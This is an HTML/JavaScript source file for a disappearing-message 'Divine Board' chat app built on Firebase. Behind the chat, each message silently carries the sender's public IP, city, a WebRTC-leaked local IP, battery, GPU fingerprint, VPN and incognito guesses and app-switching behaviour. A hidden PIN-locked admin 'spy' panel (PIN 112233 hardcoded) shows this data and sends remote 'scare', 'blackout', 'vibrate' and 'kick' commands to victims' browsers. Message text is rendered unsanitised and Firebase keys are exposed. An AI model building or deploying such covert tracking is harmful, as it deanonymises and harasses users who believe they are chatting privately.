<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secret Board (Divine)</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>

    <style>
        :root { --bg: #050505; --msg-bg: #1a1a1a; --accent: #00e676; --text: #ffffff; --danger: #ff1744; --chaos: #ff00ff; }
        * { box-sizing: border-box; font-family: 'Courier New', Courier, monospace; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; background: var(--bg); color: var(--text); overflow: hidden; position: fixed; width: 100%; height: 100%; transition: 0.3s; }

        /* App Loader */
        #app-loader { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { width: 40px; height: 40px; border: 4px solid #111; border-top-color: var(--accent); border-radius: 50%; animation: spin 1s linear infinite; }

        /* UI Elements */
        header { height: 60px; background: rgba(0,0,0,0.9); border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: center; padding: 0 15px; }
        #secret-btn { cursor: pointer; font-size: 1.5rem; filter: grayscale(1); transition: 0.3s; }
        #secret-btn:active { transform: scale(0.8); }

        #board { height: calc(100vh - 130px); overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 15px; scroll-behavior: smooth; }
        .msg-card { background: var(--msg-bg); padding: 12px; border-radius: 12px; max-width: 85%; align-self: flex-start; position: relative; animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        .msg-card.mine { align-self: flex-end; background: #003d33; border-bottom-right-radius: 2px; }
        .msg-image { max-width: 100%; border-radius: 8px; margin-bottom: 5px; }
        .progress-bar { height: 3px; background: var(--accent); width: 100%; animation: countdown 10s linear forwards; margin-top: 8px; border-radius: 2px; }

        footer { height: 70px; background: #0a0a0a; border-top: 1px solid #222; display: flex; align-items: center; padding: 0 10px; }
        .input-group { display: flex; width: 100%; background: #151515; border-radius: 30px; padding: 5px 15px; align-items: center; border: 1px solid #333; }
        input[type="text"] { flex: 1; padding: 10px; background: transparent; border: none; color: #fff; outline: none; font-size: 14px; }
        .btn-icon { font-size: 1.3rem; cursor: pointer; color: #666; padding: 5px; }
        .btn-send { color: var(--accent); font-weight: bold; }

        /* Admin Overlay */
        #admin-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 8000; display: none; flex-direction: column; padding: 20px; overflow-y: auto; backdrop-filter: blur(10px); }
        .spy-card { background: #0a0f1e; border-left: 4px solid var(--accent); padding: 15px; border-radius: 8px; font-size: 0.75rem; margin-bottom: 15px; color: #cbd5e1; }
        .spy-row { display: flex; justify-content: space-between; margin: 4px 0; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
        .spy-key { color: #64748b; }
        .spy-val { color: #fff; font-weight: bold; }
        
        .god-actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 12px; }
        .god-btn { border: none; padding: 8px; border-radius: 5px; font-size: 0.7rem; cursor: pointer; font-weight: bold; text-transform: uppercase; }

        /* Animations */
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        @keyframes countdown { from { width: 100%; } to { width: 0%; } }
        @keyframes fadeOut { to { opacity: 0; filter: blur(15px); transform: translateY(20px); } }
        
        /* Chaos Effect */
        .chaos-mode .msg-card:hover { transform: translate(50px, -50px) rotate(20deg) !important; transition: 0.1s !important; }
    </style>
</head>
<body>

<div id="app-loader"><div class="spinner"></div><p style="margin-top:10px; font-size:12px; color:var(--accent)">LINKING TO DIVINE NETWORK...</p></div>

<header>
    <span id="secret-btn" onclick="triggerAdmin()">ðŸ¤«</span>
    <h3 style="margin:0; letter-spacing:3px; color:var(--accent); font-size:0.9rem;">DIVINE BOARD</h3>
</header>

<div id="board"></div>

<div id="admin-overlay">
    <div id="admin-login" style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%;">
        <h2 style="color:var(--accent)">RESTRICTED ACCESS</h2>
        <input type="password" id="admin-pass" placeholder="PIN" maxlength="6" style="text-align:center; padding:12px; font-size:24px; border-radius:10px; width:180px; background:#111; border:2px solid #333; color:#fff; outline:none;">
        <button onclick="checkAdmin()" style="margin-top:20px; padding:12px 40px; background:var(--accent); color:#000; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">DECRYPT</button>
        <button onclick="closeAdmin()" style="margin-top:15px; color:#444; background:none; border:none;">ABORT</button>
    </div>
    
    <div id="admin-dashboard" style="display:none; flex-direction:column;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
            <h2 style="margin:0; color:var(--accent); font-size:1.2rem;">TARGET_DATABASE</h2>
            <button onclick="closeAdmin()" style="background:#333; color:#fff; border:none; padding:8px 15px; border-radius:5px;">DISCONNECT</button>
        </div>
        <div id="spy-container"></div>
    </div>
</div>

<footer>
    <div class="input-group">
        <label for="imgInput" class="btn-icon">ðŸ“·</label>
        <input type="file" id="imgInput" accept="image/*" style="display:none">
        <input type="text" id="msgInput" placeholder="Write a secret..." autocomplete="off">
        <div class="btn-icon btn-send" onclick="sendData('text')">SEND</div>
    </div>
</footer>

<script>
    // --- 1. FIREBASE SETUP ---
    const firebaseConfig = {
        apiKey: "AIzaSyDHEHqYCU1dAJLOFPC7TLOa2KucoZG4bxA",
        authDomain: "wolf-game-fdb66.firebaseapp.com",
        databaseURL: "https://mooooo-9d6b8-default-rtdb.firebaseio.com",
        projectId: "wolf-game-fdb66",
        storageBucket: "wolf-game-fdb66.firebasestorage.app",
        messagingSenderId: "10904255215",
        appId: "1:10904255215:web:7a50312897b1e97c77f91a"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const storage = firebase.storage();
    const myId = localStorage.getItem('myId') || 'DIVINE_' + Math.random().toString(36).substr(2, 5);
    localStorage.setItem('myId', myId);

    // --- 2. FORENSIC & INTERACTION ENGINE ---
    let ipInfo = { ip: 'Unknown', city: 'Unknown', org: 'Unknown' };
    let userState = "Watching";

    async function fetchForensics() {
        try { const r = await fetch('https://ipapi.co/json/'); ipInfo = await r.json(); } catch(e) {}
    }

    async function getDivineData() {
        let bat = "N/A";
        if(navigator.getBattery) { const b = await navigator.getBattery(); bat = `${Math.round(b.level*100)}%${b.charging?'âš¡':''}`; }
        
        // WebRTC Local IP Leak
        let localIp = "Hidden";
        try {
            const pc = new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => { if(e.candidate) localIp = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1]; };
        } catch(e) {}

        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

        return {
            ...ipInfo,
            localIp,
            bat,
            status: userState,
            gpu: getGPU(),
            cpu: navigator.hardwareConcurrency,
            vpn: !tz.includes("Bangkok") ? "POSSIBLE" : "CLEAN",
            screen: `${window.screen.width}x${window.screen.height}`,
            incognito: (navigator.storage && (await navigator.storage.estimate()).quota < 120000000)
        };
    }

    function getGPU() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL).split('Direct')[0];
        } catch(e) { return "Unknown"; }
    }

    // Interaction Tracking
    document.addEventListener('visibilitychange', () => { 
        userState = document.hidden ? "Switching App (Capping?)" : "Watching"; 
    });

    // --- 3. MAIN LOGIC ---
    window.onload = async () => {
        await fetchForensics();
        setTimeout(() => document.getElementById('app-loader').style.display = 'none', 1500);

        // God Command Listener
        db.ref('commands/' + myId).on('value', snap => {
            const cmd = snap.val(); if(!cmd) return;
            if(cmd.type === 'blackout') { document.body.style.filter = "brightness(0)"; setTimeout(()=>document.body.style.filter="brightness(1)", 5000); }
            if(cmd.type === 'chaos') { document.body.classList.add('chaos-mode'); setTimeout(()=>document.body.classList.remove('chaos-mode'), 10000); }
            if(cmd.type === 'scare') { new Audio('https://www.myinstants.com/media/sounds/scary.mp3').play(); alert("GOD IS WATCHING YOU"); }
            if(cmd.type === 'kick') window.location.href = "https://www.google.com";
            if(cmd.type === 'vibrate' && navigator.vibrate) navigator.vibrate([400, 200, 400]);
            db.ref('commands/' + myId).remove();
        });
    };

    // Chat Receiver
    db.ref('divine_chat').limitToLast(20).on('child_added', snap => {
        const data = snap.val();
        const timeLeft = 10000 - (Date.now() - data.timestamp);
        if(timeLeft > 0) renderMsg(data, timeLeft);
        if(document.getElementById('admin-dashboard').style.display === 'flex') renderSpy(data);
    });

    function renderMsg(data, duration) {
        const div = document.createElement('div');
        div.className = `msg-card ${data.senderId === myId ? 'mine' : ''}`;
        let content = data.type === 'image' ? `<img src="${data.content}" class="msg-image">` : `<div>${data.content}</div>`;
        div.innerHTML = `${content}<div class="progress-bar" style="animation-duration:${duration}ms"></div>`;
        document.getElementById('board').appendChild(div);
        
        setTimeout(() => {
            div.style.animation = "fadeOut 0.8s forwards";
            setTimeout(() => div.remove(), 800);
        }, duration - 800);
        document.getElementById('board').scrollTop = document.getElementById('board').scrollHeight;
    }

    async function sendData(type, content = null) {
        if(type === 'text') {
            content = document.getElementById('msgInput').value.trim();
            if(!content) return;
            document.getElementById('msgInput').value = "";
        }
        const spy = await getDivineData();
        db.ref('divine_chat').push({ type, content, senderId: myId, timestamp: firebase.database.ServerValue.TIMESTAMP, spy });
    }

    document.getElementById('imgInput').addEventListener('change', async e => {
        const file = e.target.files[0]; if(!file) return;
        const ref = storage.ref(`divine_files/${Date.now()}`);
        await ref.put(file);
        const url = await ref.getDownloadURL();
        sendData('image', url);
    });

    // --- 4. ADMIN SYSTEM ---
    let clicks = 0;
    function triggerAdmin() { 
        clicks++; 
        if(clicks >= 3) { document.getElementById('admin-overlay').style.display='flex'; clicks = 0; } 
        setTimeout(() => clicks = 0, 2000);
    }

    function checkAdmin() {
        if(document.getElementById('admin-pass').value === "112233") {
            document.getElementById('admin-login').style.display = 'none';
            document.getElementById('admin-dashboard').style.display = 'flex';
            db.ref('divine_chat').once('value', snap => {
                document.getElementById('spy-container').innerHTML = "";
                snap.forEach(child => renderSpy(child.val()));
            });
        } else { closeAdmin(); }
    }

    function closeAdmin() { 
        document.getElementById('admin-overlay').style.display='none'; 
        document.getElementById('admin-login').style.display='flex';
        document.getElementById('admin-dashboard').style.display='none';
        document.getElementById('admin-pass').value = "";
    }

    function renderSpy(data) {
        const container = document.getElementById('spy-container');
        const s = data.spy || {};
        const card = document.createElement('div');
        card.className = 'spy-card';
        card.innerHTML = `
            <div style="color:var(--accent); margin-bottom:10px; border-bottom:1px solid #222; padding-bottom:5px;">[${data.type.toUpperCase()}] ${data.type==='text'?data.content:''}</div>
            <div class="spy-row"><span class="spy-key">USER_ID</span><span class="spy-val">${data.senderId}</span></div>
            <div class="spy-row"><span class="spy-key">BEHAVIOR</span><span class="spy-val" style="color:var(--chaos)">${s.status}</span></div>
            <div class="spy-row"><span class="spy-key">GEO_IP</span><span class="spy-val">${s.city} (${s.ip})</span></div>
            <div class="spy-row"><span class="spy-key">INTERNAL_IP</span><span class="spy-val">${s.localIp}</span></div>
            <div class="spy-row"><span class="spy-key">HARDWARE</span><span class="spy-val">${s.cpu} CORE | ${s.bat}</span></div>
            <div class="spy-row"><span class="spy-key">GPU_CHIP</span><span class="spy-val">${s.gpu}</span></div>
            <div class="spy-row"><span class="spy-key">VPN_CHECK</span><span class="spy-val">${s.vpn}</span></div>
            
            <div class="god-actions">
                <button class="god-btn" style="background:#444; color:#fff;" onclick="sendCmd('${data.senderId}','blackout')">Blackout</button>
                <button class="god-btn" style="background:var(--chaos); color:#fff;" onclick="sendCmd('${data.senderId}','chaos')">Chaos</button>
                <button class="god-btn" style="background:var(--danger); color:#fff;" onclick="sendCmd('${data.senderId}','kick')">Kick</button>
                <button class="god-btn" style="background:#6a1b9a; color:#fff;" onclick="sendCmd('${data.senderId}','scare')">Scare</button>
                <button class="god-btn" style="background:#f1c40f; color:#000;" onclick="sendCmd('${data.senderId}','vibrate')">Vibrate</button>
            </div>
        `;
        container.prepend(card);
    }

    function sendCmd(uid, type) {
        db.ref('commands/' + uid).set({ type, ts: Date.now() });
        alert("COMMAND EXECUTED: " + type.toUpperCase());
    }
</script>
</body>
</html>
